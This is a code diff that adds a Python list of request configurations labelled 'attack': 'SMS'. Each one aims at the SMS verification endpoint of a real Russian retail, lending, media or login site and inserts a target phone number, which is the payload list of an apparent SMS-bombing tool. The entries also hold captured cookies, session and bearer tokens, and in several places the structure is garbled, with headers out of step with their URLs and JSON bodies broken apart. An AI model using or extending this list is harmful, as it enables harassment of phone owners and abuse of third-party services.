+                'user-agent': user_agent()[0],
+                'version': 'b835b033'
+            },
+            'data': {
+                '{"jsonrpc': '2.0", "id": 8, "method": "auth.GetCode',
+                'params': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'spb.uteka.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://spb.uteka.ru/rpc/?method=auth.GetCode',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'authorization': 'Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn',
+                'content-length': '220',
+                'content-type': 'application/json',
+                'origin': 'https://elementaree.ru',
+                'referer': 'https://elementaree.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                '{"operationName': number,
+                'query': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'api-new.elementaree.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api-new.elementaree.ru/graphql',
+            'headers': {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Client': 'angular_web_0.0.2',
+                'Connection': 'keep-alive',
+                'Content-Length': '82',
+                'Content-Type': 'text/plain',
+                'Cookie': 'qrator_msid=1667526234.775.XKeTKEPsW4ov4g4D-6qn2qar0j8pjc4gatudrriv26nb4dhqp; Utk_DvcGuid=50e83205-9a55-845c-3d3e-363cdc1925e4; Utk_SessionToken=3928A6E837779529C395A626B52E49E2; User_Agent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_MrkGrpTkn=1FCF76D07C49A5ED62F64683C21656E9; agree_with_cookie=true; Utk_SssTkn=3928A6E837779529C395A626B52E49E2',
+                'Deviceid': '50e83205-9a55-845c-3d3e-363cdc1925e4',
+                'Host': 'moscow.online.lenta.com',
+                'Origin': 'https://moscow.online.lenta.com',
+                'Referer': 'https://moscow.online.lenta.com/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'SessionToken': '3928A6E837779529C395A626B52E49E2',
+                'User-Agent': user_agent()[0],
+                'x-domain': 'moscow',
+                'x-retail-brand': 'lo'
+            },
+            'data': {"method": "authCodeSend", "params": {"phone": number}, "jsonrpc": "2.0", "id": 12}
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'moscow.online.lenta.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://moscow.online.lenta.com/jrpc',
+            'headers': {
+
+            },
+            'data': {
+                'except': '',
+                'try': '',
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2Njc1MjY0NzEsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NzUzMDI0NzF9.9Fgzk9RrWW82n5F2uUggsAyBuZHc_fqWZp-GOxph5qk',
+                'Connection': 'keep-alive',
+                'Cookie': 'qrator_jsr=1667526415.893.MfERRj629UrSfHpf-8rtud06upbosderhvl5g1ef3390ea0d5-00; qrator_jsid=1667526415.893.MfERRj629UrSfHpf-jm7luqtsup8el3ol2j60phv7fkan9i6u; qrator_ssid=1667526416.258.OYUlKh0aP6DY18Jw-u4fv9j20mlns9csfk011vboa84jsc382; isEreceiptedPopupShown_=true; ab_test_popup_delivery=test_group; motopopupforeveryone=1; isAddressPopupShown_=true; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; tmr_lvid=1af3ad7f44323452a463acb0f7f4e6ba; tmr_lvidTS=1667526432573; _ym_uid=166752643344618027; _ym_d=1667526433; kameleoonVisitorCode=_js_dq2tzq3u66bvzpow; rrpvid=149419622442899; _userGUID=0:la1u6mdr:Ks5DPIpdJXdMpsJ2bfqnyt6SX4WcJDpg; dSesn=36d4984e-ef17-39b9-6c97-f9b8134436c1; _dvs=0:la1u6mdr:OwFvRPS2gUvDudZhy0uiDpFn6wuQj3Eh; _ym_isad=2; rcuid=63646f12e2746a93f2420567; haveChat=true; tmr_detect=0%7C1667526435285; device_id=206053908846.45267; tmr_reqNum=5',
+                'Host': 'www.auchan.ru',
+                'phone': number,
+                'Referer': 'https://www.auchan.ru/auth/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'source': '4',
+                'User-Agent': 'user'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.auchan.ru',
+                'anonymous': 'No'
+            },
+            'method': 'get',
+            'url': 'https://www.auchan.ru/v1/cmd/clientprofile/checkphone',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '0',
+                'content-type': 'application/json',
+                'cookie': '_cfuvid=niRXx8FEscDdwEZcbQBkuUsNaKKENY758SgtDB57zoA-1667585854597-0-604800000; favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; searchPlaceholder=%25D0%25A3%25D1%2586%25D0%25B5%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5%2520%25D1%2581%25D0%25BC%25D0%25B0%25D1%2580%25D1%2582%25D1%2584%25D0%25BE%25D0%25BD%25D1%258B; __cf_bm=aBYWEoj8cSOBrcje9oCzroNpBVWTD0qYy_avyt1ea2g-1667590182-0-AXB6r6+dn1ulF7849ULVkAdvlQwYGsG9o4/7Hke1yzaI5xD+kHzm18NsHRU8UJFr6pkbrkJ8T3F8ZEdq0ZzXRfOjH8NTmifBlC1B+icPKgWuyiBpmhdLKZPy669t6TZkTocJNii2TX87IZjN0ER0Tcu9YAtHYnErIk5enhaa9K7lOL6VPE4p+wtDuJkSx7rTOA==',
+                'origin': 'https://www.svyaznoy.ru',
+                'referer': 'https://www.svyaznoy.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.svyaznoy.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{str(number)[1:]}',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'cache-control-version': '527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f',
+                'content-length': '38',
+                'content-type': 'application/json',
+                'cookie': 'referrer_first=dir; referrer_hist=dir; referrer=; accept_language=ru; abst=test_a; vid=b13a31d4-2feb-49e0-8f7d-a33aface1476; rm=758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249; sid=g0v+9sLViCLWl3Koz3ws/AwH; ENVID=production-a|Y2VvQ',
+                'origin': 'https://www.onetwotrip.com',
+                'referer': 'https://www.onetwotrip.com/ru/p/account',
+                'sec-ch-ua': 'Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-ott-cookie': '',
+                'Host': 'id.x5.ru',
+                'Connection': 'keep-alive',
+                'Content-Length': '62',
+                'Content-Type': 'text/plain;charset=UTF-8',
+                'User-Agent': user_agent()[0],
+                'Accept': '*/*',
+                'Origin': 'https://id.x5.ru',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Dest': 'empty',
+                'Referer': 'https://id.x5.ru/',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
+                'Cookie': 'ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; NSC_je_djq_l8t_31443_IUUQT_OB_WT=ffffffffc3a06eea45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; TS9f472ee0027=08549da071ab200080e88c8e8e79e0a43eec4808dc4dbf3994e4c7202a42afcb9ff6e8076bae3b9a083c8fa200113000306ff3aaede77deedd6aa63205e1b29bbdaf2a4c116f66a0c6d4cefe4d22b0b7ba3d19b0aaa7c1d572af87f3342ab1a8'
+            },
+            'data': {
+                'phone': number,
+                'reseller': ''
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'id.x5.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://id.x5.ru/graphql',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '368',
+                'content-type': 'application/json;charset=UTF-8',
+                'cookie': '__ddg1_=7adIg7X1SQ3s1sqTbKQz; PHPSESSID=a840033f0d2b10e34442f83013bb3f0f; partner=zseo',
+                'origin': 'https://borrow.zaymigo.com',
+                'referer': 'https://borrow.zaymigo.com/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                '{"jsonrpc': '2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create',
+                'params': '{',
+                'borrower': '{"surname": "Пупкин", "name": "Василий", "patronymic": "Андреевич',
+                'patronymicNotExists': number,
+                'phoneParams': '[]}',
+                'term': '12, "amount": 10000',
+                'agreements': '[{"name": "assignment_of_claims", "val": True}]}}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'borrow.zaymigo.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://borrow.zaymigo.com/rpc/v1',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '224',
+                'content-type': 'application/json',
+                'cookie': '_ga=GA1.2.2108841258.1667680421; _gid=GA1.2.1628483400.1667680421; tmr_lvid=5c385c2b38e5657a71fb6f8ccf348cf0; tmr_lvidTS=1667680421368; _ym_uid=1667680422433564150; _ym_d=1667680422; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL; __cfruid=354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508; ec_id=b22e8141-a6a2-49e9-addf-d0958d4b2bef; tmr_detect=0%7C1667680526135; deviceUid=ff004018-91ab-4913-9761-9c8c510136c2; tmr_reqNum=15',
+                'origin': 'https://adengi.ru',
+                'referer': 'https://adengi.ru/registration/personal',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
+                'x-version-fe': '1666591147478'
+            },
+            'data': {
+                'email': email(),
+                'firstName': 'Василий',
+                'hash': 'a6ac90134b55d015bd2731fd4e2f06d3',
+                'lastName': 'Пупин',
+                'middleName': 'Иванович',
+                'phone': number,
+                'timestamp': '1667680555',
+                'via': 'sms'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'adengi.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://adengi.ru/rest/v1/registration/code/send',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '117',
+                'content-type': 'application/json',
+                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==; uteka_city_id=47; _ru_yandex_autofill=not_available',
+                'origin': 'https://krym.uteka.ru',
+                'platform': 'Desktop',
+                'referer': 'https://krym.uteka.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'version': 'b835b033'
+            },
+            'data': {
+                '{"jsonrpc': '2.0", "id": 6, "method": "auth.GetCode',
+                'params': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'krym.uteka.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://krym.uteka.ru/rpc/?method=auth.GetCode',
+            'headers': {
+                'Accept': 'application/json',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Authorization': '',
+                'Cache-Control': 'max-age=0',
+                'Connection': 'keep-alive',
+                'Content-Length': '82',
+                'Content-Type': 'application/json',
+                'Cookie': 'zdr_customer_external_id=44e62396-1cee-4165-80a3-8ce848633410; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D; deviceId=6adada4b-b83b-406a-ac5b-b6101d282cdc; is-converted-basket=true; is-converted-liked=true; qrator_jsid=1667778933.193.ee7fMuSZ0aiaAQ0h-9qis1t0fph2cphoe2s5j19q05nb2m296',
+                'Host': 'zdorov.ru',
+                'Origin': 'https://zdorov.ru',
+                'Referer': 'https://zdorov.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'phone': number,
+                'deviceId': '6adada4b-b83b-406a-ac5b-b6101d282cdc',
+                'term': '2'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'zdorov.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://zdorov.ru/backend/api/customer/confirm',
+            'headers': {
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '101',
+                'Content-type': 'application/vnd.api+json',
+                'Cookie': 'guid_city=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; name_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; guid_region=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; guid_country=8aa15da9-92a4-4530-ab74-1992c973c539; region_timezone=UTC%2B3%3A00; ab-test-user-id=b81234b62c57e7db8f97bb8c5aae7d2dc5a20488c38e1f6963ee8a14a3356f7da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22933133d1ca8f2277c2dbc5671647b30d%22%3B%7D; fuser_id=400a9f05c3d4eea2e6a463167ceffc5a9113a569cfa9a16392484053b87bfcaaa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%2224e973c408cc57099eac88d53ad12205%22%3B%7D; PHPSESSID=0hd82290tod529ln49unqlitke; _csrf=ab463b1a39cb814c72899b49f7e46e245f5ca7b88de51eda4075fd2da58abc93a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22-qTZJe5FI0mRe2WzkLYoSlrqTgr4wVOJ%22%3B%7D; inova_p_sid=qol791i_221109090955; windowDate=2022%2011%2009',
+                'Host': 'sokolov.ru',
+                'Origin': 'https://sokolov.ru',
+                'Referer': 'https://sokolov.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'data': '{"type": "login',
+                'attributes': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'sokolov.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://sokolov.ru/api/v4/profile/user/send-code',
+            'headers': {
+
+            },
+            'data': {
+                '{"data': number,
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '68',
+                'Content-Type': 'application/json',
+                'Cookie': 'xid=f977bd6a-7555-4825-8c30-2f80517a7c81; catalogGender=women; uuid=84513f80-afe7-4390-b9ab-cbef7219cdc9; siteVer=1.0.0; _slfs=1668014274236; _slid=636be0af01b07254b104fe53; _slsession=06C229F2-EBA7-43B8-BE6D-ED83E1A61A4E; actual-checkout-type=cart; gtmc_userAuth=0; __zzatw-tsum=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VfRGwkGXtfUEBcUn4qFhV/bShMDz5ePT5vMTE7ah5meGBSS1Y/dRdZRkE2XBpLdWUJCzowJS0xViR8SylEW1MJJRoVeXIoVg0QVy8QLj9hTixcIggWEU0hF0ZaFXtDPGMMcRVNfX0mNGd/ImUrOVURCBISIGNVWml1WQhDThgSPV8qWFcMNHhlEENYfXFrL2R7RSRfHDx1ZS8zaWVpcC9gIBIlEU0hF0ZaFXtDLGAMcRVcQ0d1cyo/ZyRkTl8nP0ccOmlRJD4yXhA8dWUJCzowJS0xZid8Syk1HREyXldVNDtnQXt1IHJ+FDllDFcnHXgdYngqIg==H7n1MA==; wishlist_sid=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_release=19257c11ea8e8373036b532c32b28dc6458b591b; gtmc_city=%D0%A1%D1%82%D1%80%D0%B0%D1%81%D0%B1%D1%83%D1%80%D0%B3; gtmc_region=null; gtmc_country=%D0%A4%D1%80%D0%B0%D0%BD%D1%86%D0%B8%D1%8F; x-wishlist-sid-local=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; gssc213163=; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; gsscw-tsum=dJzFkoZnrNwUdl/mSDzQo81riC8qq0GIsZzhPoLf0pZbmGjgRYPcM0QWcCFS7kRNN1aHi7mPHqeUa0A3H9gCx77HRnAF9GCMKyoeoR/wxTE2cjEVVe1BRX45yL//NylMoPtcS7YG1Qk9Nr47WK5l+plq0NMS1PeKrSRLRtgMuqcuMW8KQJArwzF1EBHLsSr9he4hueRZ55gl/DHmCBHWblQMRKQJP4gdDB2bpqReQMdRJQPf5OJSqXSR+X7Gyo6s5rwRHPY43wDGgmRx2uxB; fgsscw-tsum=HM2a24aeaad3ebe9f3acf27c1860f9e7d6769237',
+                'Host': 'api.tsum.ru',
+                'Origin': 'https://www.tsum.ru',
+                'Referer': 'https://www.tsum.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': 'user',
+                'X-Client-Date': '09.11.2022, 18:18:06',
+                'X-Site-Region': 'RU',
+                'X-Uid': '84513f80-afe7-4390-b9ab-cbef7219cdc9',
+                'X-XID': 'f977bd6a-7555-4825-8c30-2f80517a7c81'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'api.tsum.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.tsum.ru/v2/authorize/request-sms',
+            'headers': {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '51',
+                'Content-Type': 'application/json',
+                'Cookie': 'SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU',
+                'Host': 'bmp.megafon.tv',
+                'Origin': 'https://megafon.tv',
+                'Referer': 'https://megafon.tv/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'msisdn': number,
+                'password': '200147200147'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'bmp.megafon.tv',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://bmp.megafon.tv/api/v10/auth/register/msisdn',
+            'headers': {
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '107',
+                'content-Type': 'application/json',
+                'Cookie': 'suid=69c5eebce8dd622b0c61536c8880755b.bbb938e4d6d90b9ea4f49bd33d6b9228; autoru_sid=a%3Ag636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca%7C1668014724703.604800.tb-QtFaltosbNGBHFhXuUw.PIb8E2rWYxc1npgvR-99UIXOd3VYt8YlJqswR1Yd1nM; autoruuid=g636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca; autoru_gdpr=1; spravka=dD0xNjY4MDE0NzQwO2k9MTUxLjEwNi4xMi4yNDY7RD1DMzVBNEZGODRDMDg4OTU3MkRGOTREMEFCRTM5M0NBOTE2N0JFRjBENzU0QTIwRTgwODM2OTE4NEFFMUI1MTFEQzE3N0FDQjk7dT0xNjY4MDE0NzQwNjg1ODYyNjQyO2g9YTU5NDM0N2U1ZGMyYWEwZmZlZTUzMGQ1YzFlYjQ0YTU=; _yasc=BfGUGpXLHtiBxKt6L6s4IsWKTSltQon0caSV3VQUM02jgcteHq6J+3znIWK0; _csrf_token=99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
+                'Host': 'auth.auto.ru',
+                'Origin': 'https://auth.auto.ru',
+                'Referer': 'https://auth.auto.ru/login/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0],
+                'x-csrf-token': '99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            'data': {
+                '{"items': '[',
+                '{"path': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'auth.auto.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://auth.auto.ru/-/ajax/auth/',
+            'headers': {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
+                'Host': 'passport.yandex.ru',
+                'Origin': 'https://passport.yandex.ru',
+                'Referer': 'https://passport.yandex.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0],
+                'X-Requested-With': 'XMLHttpRequest',
+                'Content-Length': '183'
+            },
+            'data': {
+                'track_id': 'str4',
+                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
+                'password': 'Hoho_HO123',
+                'login': 'korotkovateng1987-qw',
+                'phone_number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'passport.yandex.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://passport.yandex.ru/registration-validations/password',
+            'headers': {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '174',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
